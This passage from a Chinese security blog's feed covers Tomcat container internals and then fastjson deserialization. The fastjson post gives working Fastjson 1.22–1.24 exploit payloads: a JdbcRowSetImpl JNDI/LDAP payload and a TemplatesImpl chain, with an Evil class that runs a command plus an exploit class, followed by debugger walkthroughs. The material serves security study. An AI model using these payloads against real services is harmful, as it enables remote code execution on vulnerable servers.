src="https://cdn.clown2024.cn/202409121054829.png" alt="image-20240912105432764"></p><p>我们也可以在server.xml里面设置是否进行自动解压</p><p><img src="https://cdn.clown2024.cn/202409121055233.png" alt="image-20240912105551171"></p><p>那么jar包呢？</p><p>其实jar的内容和war包解压出来是没有什么区别的，jar和war包主要是tomcat启动时用来区分这是一个依赖还是一个应用</p><p><strong>tomcat应用的几种部署方式</strong></p><p>部署的几种方式可以在<strong>HostConfig#deployApps</strong>中看到</p><p><img src="https://cdn.clown2024.cn/202409121100464.png" alt="image-20240912110054380"></p><ol><li>描述符部署</li><li>war包部署</li><li>文件夹部署，就是将war解压的文件夹直接放到webapps下面，和war包部署没什么区别</li></ol><blockquote><p>源码中可以看到tomcat部署应用的时候是进行多线程部署的</p></blockquote><p><strong>描述符部署</strong></p><p>描述符部署用的是&lt;Context&gt;标签，比如我要布置上面的应用可以在server.xml这样配置</p><p><img src="https://cdn.clown2024.cn/202409121117862.png" alt="image-20240912111717790"></p><p>docBase就是应用的目录，到时候tomcat就会从该目录查找所需要的资源比如我们的class文件</p><h3><span id="context">Context</span></h3><p>Context的本质上就是一个容器，源码中就有一个叫做Context的接口</p><p><img src="https://cdn.clown2024.cn/202409121149984.png" alt="image-20240912114943927"></p><p>他继承自一个Container接口，我们可以去看看Container有哪些继承接口，里面就包含着tomcat的四大容器</p><h2><span id="tomcat容器">Tomcat容器</span></h2><p><img src="https://cdn.clown2024.cn/202409121151081.png" alt="image-20240912115147007"></p><p>tomcat的四大容器：</p><ul><li><p>Context：就是一个web应用程序，也就是我们前面配置的程序，配置在Host节点下面</p></li><li><p>Host：表示一个虚拟主机，一个虚拟主机下面可以有很多的应用</p><p><img src="https://cdn.clown2024.cn/202409121154456.png" alt="image-20240912115408390"></p><p>name就是主机名，appBase就是应用目录，也就是我们为什么要放在webapps下面</p></li><li><p>Engine：字面意思引擎，Host是Engine的子节点</p><p><img src="https://cdn.clown2024.cn/202409121157589.png" alt="image-20240912115730532"></p><p>在Engine里面，我们是可以定义多个虚拟主机，所以也就是我们可以将不同的应用放在不同的主机下，通过不同的主机名访问具体应用，不至于将所有应用放在localhost下面。</p></li><li><p>Wrapper：它实际上就封装着一个Servlet，负责管理整个Servlet的生命周期，包括装载、初始化、资源回收等。</p></li></ul><blockquote><p><img src="https://cdn.clown2024.cn/202409121216408.png" alt="image-20240912121655347"></p><p>我们正常会继承一个HttpServlet，所有访问这个Servlet的请求是共用一个Servlet实例也就是单例模式，但如果实现SingleThreadModel接口的话就是每个请求单独拥有一个实例</p></blockquote><p>整个容器的层级结构就如下：<br>Engine&#x3D;&#x3D;》Host&#x3D;&#x3D;》Context&#x3D;&#x3D;》Wrapper&#x3D;&#x3D;》Servlet</p><p>再讲讲为什么要多一个Wrapper，因为我们有时候会有多个Servlet实例，全放在Context下面会不好管理，所以就用Wrapper将Servlet实例按照类型管理起来，所以存储结构类似如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Engine:<br>List&lt;Host&gt;<br>Host:<br>List&lt;Context&gt;<br>Context<br>List&lt;Wrapper&gt; list;<br>Wrapper---Servlet类<br>List&lt;Servlet&gt; servlets;<br></code></pre></td></tr></table></figure><h3><span id="pipeline">Pipeline</span></h3><p>这里也可以看一下这篇文章：<a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">https://www.cnblogs.com/coldridgeValley/p/5816414.html</a></p><p>pipeline翻译过来就是管道，每一个容易都有一个管道组件，pipeline里面又有valve阀门</p><p>所以上面的结构又可以优化成这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Engine:<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Host&gt;<br>Host:<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Context&gt;<br>Context<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Wrapper&gt; list;<br>Wrapper---Servlet类<br>Pipeline:<br>List&lt;valve&gt;<br>List&lt;Servlet&gt; servlets;<br></code></pre></td></tr></table></figure><p>我们的Request对象想要最终servlet里面的doGet等方法，会经过前面一系列的容器、管道、阀门。</p><p>每个管道最重要的是最后一个阀门，因为他要负责将request往下一个容器进行传递，所以最后一个阀门是tomcat提前写好的。</p><p><strong>Valve节点</strong></p><p>该节点配置在Host节点下面，可以配置经过该阀门时需要做什么，我们只需要去实现或继承valve相关的接口或类即可自己配置</p><p><img src="https://cdn.clown2024.cn/202409121354703.png" alt="image-20240912135432620"></p><p>比如下面的记录日志</p><p><img src="https://cdn.clown2024.cn/202409121200163.png" alt="image-20240912120035093"></p><h3><span id="standardwrapper">StandardWrapper</span></h3><p>这里我们去看一下Wrapper的pipeline的最后一个valve，因为他是直接和servlet接触的；</p><p>Wrapper的实现类是StandardWrapper</p><p><img src="https://cdn.clown2024.cn/202409121358782.png" alt="image-20240912135850663"></p><p>这个valve就是我们说的最后一个valve</p><p><img src="https://cdn.clown2024.cn/202409121400857.png" alt="image-20240912140039778"></p><p>具体的逻辑在StandardWrapperValve的invoke方法里面，可以看到这里接受了Request和Response</p><p>我们来看一下他里面一些关键的步骤</p><p><img src="https://cdn.clown2024.cn/202409121956314.png" alt="image-20240912195619220"></p><p>这里是分配servlet实例的地方，方法里的具体逻辑就不分析，知道他的作用就好</p><p><img src="https://cdn.clown2024.cn/202409121957566.png" alt="image-20240912195722497"></p><p>然后这里生成了一个filterchain，将我们的request、wrapper、servelt都封装了进去，这里的filterchain就是我们前面提到Filter</p><p><img src="https://cdn.clown2024.cn/202409122000325.png" alt="image-20240912200056244"></p><p>然后最终的操作就是在我们的doFilter里面进行，我们自己要建立Filter也是像写servlet一样，写一个类继承Filter相关的接口，然后在web.xml中配置，和要过滤的servlet对应起来</p><p><img src="https://cdn.clown2024.cn/202409122007925.png" alt="image-20240912200740837"></p><p>后面的调用流程就自己调一下源码看看就好了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学内存马前就要来学一学java web三大件的相关原理：Servlet、Filter、Listener&lt;/p&gt;
&lt;p&gt;参考文章：&lt;a href=&quot;https://www.cnblogs.com/jadite/p/16951328.html&quot;&gt;https://www.cnbl</summary>
      
    
    
    
    <category term="java基础" scheme="https://clowsman.github.io/categories/java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>fastjson反序列化</title>
    <link href="https://clowsman.github.io/2024/08/24/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/08/24/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-08-23T17:35:44.000Z</published>
    <updated>2024-09-05T15:19:41.439Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="fastjson介绍">fastjson介绍</span></h1><p>官方github地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p><p><strong>简单例子</strong></p><p>用Json的toJSONString方法将pojo类转换成字符串</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Student构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;clown&quot;</span>);<br>        student.setAge(<span class="hljs-number">23333</span>);<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteClassName));<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteEnumUsingToString));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408281554948.png" alt="image-20240828155427856"></p><p>这里的<strong>SerializerFeature.WriteClassName</strong>顾名思义就是指定序列化出来的字符串的格式，这里就是写出类名和键值对形式，更多的可以看源码尝试</p><p>JSON.parseObject将字符串转换回pojo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Student构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;clown&quot;</span>);<br>        student.setAge(<span class="hljs-number">23333</span>);<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteClassName));<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteEnumUsingToString));<br>        <span class="hljs-comment">//转变回pojo</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;&#125;&quot;</span>, Student.class, Feature.SupportNonPublicField);<br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>        System.out.println(obj.getName() + <span class="hljs-string">&quot; &quot;</span> + obj.getAge());<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408281555070.png" alt="image-20240828155545016"></p><p>这里注意要写全类名不然会报错</p><p>这里的<strong>Feature.SupportNonPublicField</strong>顾名思义也是还原的特点，这里是还原私有属性</p><p>然后我们注意到这里转换成pojo对象时会调用构造函数，其实还会调用他的set和get方法，所以fastjson的反序列化指的并不是java原生的反序列化，而是他json转化的过程。</p><p>将代码改一下看一下效果</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Student构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMap</span><span class="hljs-params">(String map)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setMap&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMap</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getMap&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//这种方法会调用get和set方法</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;,\&quot;map\&quot;:\&quot;ceshi\&quot;&#125;&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">javaObject</span> <span class="hljs-operator">=</span> obj.toJavaObject(Student.class); <span class="hljs-comment">//只传一个参数只返回JSONObject类型，可以这样转换</span><br>        <span class="hljs-comment">//System.out.println(javaObject.getName() + &quot; &quot; + javaObject.getAge()+ &quot; &quot; + javaObject.getMap());</span><br>        System.out.println(<span class="hljs-string">&quot;------------------&quot;</span>);<br>        <span class="hljs-comment">//这种方法只调用set方法</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;&#125;&quot;</span>, Student.class);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408282208338.png" alt="image-20240828220804265"></p><p>可以看到转换的时候会再一次调用set方法，而且注意这里的map属性我是没有设置的，但要是我的json字符串里有map属性也会调用对应的方法，不过对应的java对象get回来的属性值就为null</p><p>这里copy一下y4✌的总结：<a href="https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95.md">https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95.md</a></p><ul><li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法会被调用两次；</li><li>当反序列化为<code>JSON.parseObject(*,*.class)</code>形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；</li><li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即<code>JSON.parseObject(*,*.class)</code>形式得到的都是特定的Student类；</li></ul><blockquote><p>还有源码的调用分析不写了太臭太长了，看组长的视频已经要晕了，后面看链子的时候穿插着分析吧</p></blockquote><p>这里还有一张调用类的关系图</p><p><img src="https://cdn.clown2024.cn/202408282214028.png" alt="1"></p><blockquote><p>JSON：门面类，提供入口</p><p>DefaultJSONParser：主类</p><p>ParserConfig：配置相关类</p><p>JSONLexerBase：字符分析类</p><p>JavaBeanDeserializer：JavaBean反序列化类</p></blockquote><p>fastjson的利用的入口点就是对应的set或get方法的链子</p><h1><span id="fastjson122-124-jndi">Fastjson1.22-1.24 JNDI</span></h1><h2><span id="基于jdbcrowsetimpl的利用链">基于JdbcRowSetImpl的利用链</span></h2><p>他的触发点在**JdbcRowSetImpl#connect()**里面</p><p><img src="https://cdn.clown2024.cn/202408291556886.png" alt="image-20240829155500981"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/mQAZldWR\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;<br>JSON.parse(payload);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408291630333.png" alt="image-20240829163040221"></p><blockquote><p>这里payload用parse或者parseObject都能触发</p><p>这里还学到了用yakit直接搭建JNDI服务器，特别方便</p><p><img src="https://cdn.clown2024.cn/202408291629022.png" alt="image-20240829162951907"></p><p>配置一下payload就能直接用了</p></blockquote><p>看一下利用链过程吧，这是从set方法打的，根据payload我们去看一下setAutoCommit方法，因为我们设置了autoCommit属性他就会走到这</p><p><img src="https://cdn.clown2024.cn/202408291726876.png" alt="image-20240829172622802"></p><p>这里conn一开始为空就会走到connect()方法</p><p><img src="https://cdn.clown2024.cn/202408291730922.png" alt="image-20240829173035857"></p><p><img src="https://cdn.clown2024.cn/202408291730868.png" alt="image-20240829173051811"></p><p>然后我们payload里面控制了一下dataSource属性值为恶意ldap服务器即可</p><p><strong>调试一下执行流程</strong></p><p>其实就是走一下前面没分析的反序列化的过程顺便调一下</p><p><img src="https://cdn.clown2024.cn/202408291632353.png" alt="image-20240829163154441"></p><p>因为要到toJSON方法才会调用get方法，前面直接到parse调用set方法触发更容易满足条件</p><p>一路跟进到这里</p><p><img src="https://cdn.clown2024.cn/202408291705004.png" alt="image-20240829170515929"></p><p>获取一个反序列化器，然后继续往里跟进</p><p><img src="https://cdn.clown2024.cn/202408291700828.png" alt="image-20240829170031726"></p><p>这里建立一个JavaBeanInfo类，里面就进行了对该类的各种字段和方法还有构造器的封装等，后面有链子需要利用到再详细说</p><p><img src="https://cdn.clown2024.cn/202408291649160.png" alt="image-20240829164912083"></p><p>然后继续跟进到执行lookup的地方</p><p><img src="https://cdn.clown2024.cn/202408291719865.png" alt="image-20240829171913782"></p><p>这里的getDataSourceName()我们可以控制</p><p><img src="https://cdn.clown2024.cn/202408291719522.png" alt="image-20240829171950465"></p><p>然后成功弹计算器。</p><p>不过jndi的打法有版本限制、依赖限制以及要出网</p><h1><span id="fastjson122-124-templatesimpl">Fastjson1.22-1.24 TemplatesImpl</span></h1><p><strong>限制</strong></p><p>该利用链需要设置<code>Feature.SupportNonPublicField</code>才能成功触发</p><p><strong>利用代码</strong></p><p>写一个恶意类继承<strong>AbstractTranslet</strong> </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> &#123;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Evil</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Evil</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再写一个exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> +<br>                    <span class="hljs-string">&quot;\&quot;_version\&quot;:\&quot;\&quot;&#125;\n&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行结果</p><p><img src="https://cdn.clown2024.cn/202408301123547.png" alt="image-20240830112259389"></p><p><strong>调用流程分析</strong></p><p>Fastjson默认只会反序列化public修饰的属性，outputProperties和_bytecodes由private修饰，必须加入<code>Feature.SupportNonPublicField</code>在parseObject中才能触发</p><p>现在parseObject下断点，然后跟进</p><p><img src="https://cdn.clown2024.cn/202408301652896.png" alt="image-20240830165233826"></p><p>继续跟进这个DefaultJSONParser方法</p><p><img src="https://cdn.clown2024.cn/202408301658846.png" alt="image-20240830165823736"></p><p>这里token赋的值为12，先记住</p><p><img src="https://cdn.clown2024.cn/202408301700254.png" alt="image-20240830170035160"></p><p>然后继续跟进parseObject方法</p><p><img src="https://cdn.clown2024.cn/202408301704915.png" alt="image-20240830170443834"></p><p>一路跟进到DefaultJSONParser的parse方法，继续往下</p><p><img src="https://cdn.clown2024.cn/202408301706899.png" alt="image-20240830170659818"></p><p>然后根据token为12代表”{“判断到这，我们跟进parseObject方法</p><p><img src="https://cdn.clown2024.cn/202408301709246.png" alt="image-20240830170954179"></p><p>进到这里遍历lexer的text属性里我们传的json字符串，一开始扫描到’”‘字符</p><p>然后就走到下面这里</p><p><img src="https://cdn.clown2024.cn/202408301713804.png" alt="image-20240830171321736"></p><p>然后取得key为@type</p><p><img src="https://cdn.clown2024.cn/202408301715496.png" alt="image-20240830171538418"></p><p>然后继续往下</p><p><img src="https://cdn.clown2024.cn/202408301720580.png" alt="image-20240830172002493"></p><p>这里的DEFAULT_TYPE_KEY就是@type，然后调用scanSymbol()获取到了@type对应的指定类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，并调用TypeUtils.loadClass()函数加载该类</p><p>继续往下</p><p><img src="https://cdn.clown2024.cn/202408301723344.png" alt="image-20240830172310261"></p><p>这里对类名进行了判断，涉及到后面新版本绕过黑名单的方法先留意一下</p><p>现在继续往下</p><p><img src="https://cdn.clown2024.cn/202408301725620.png" 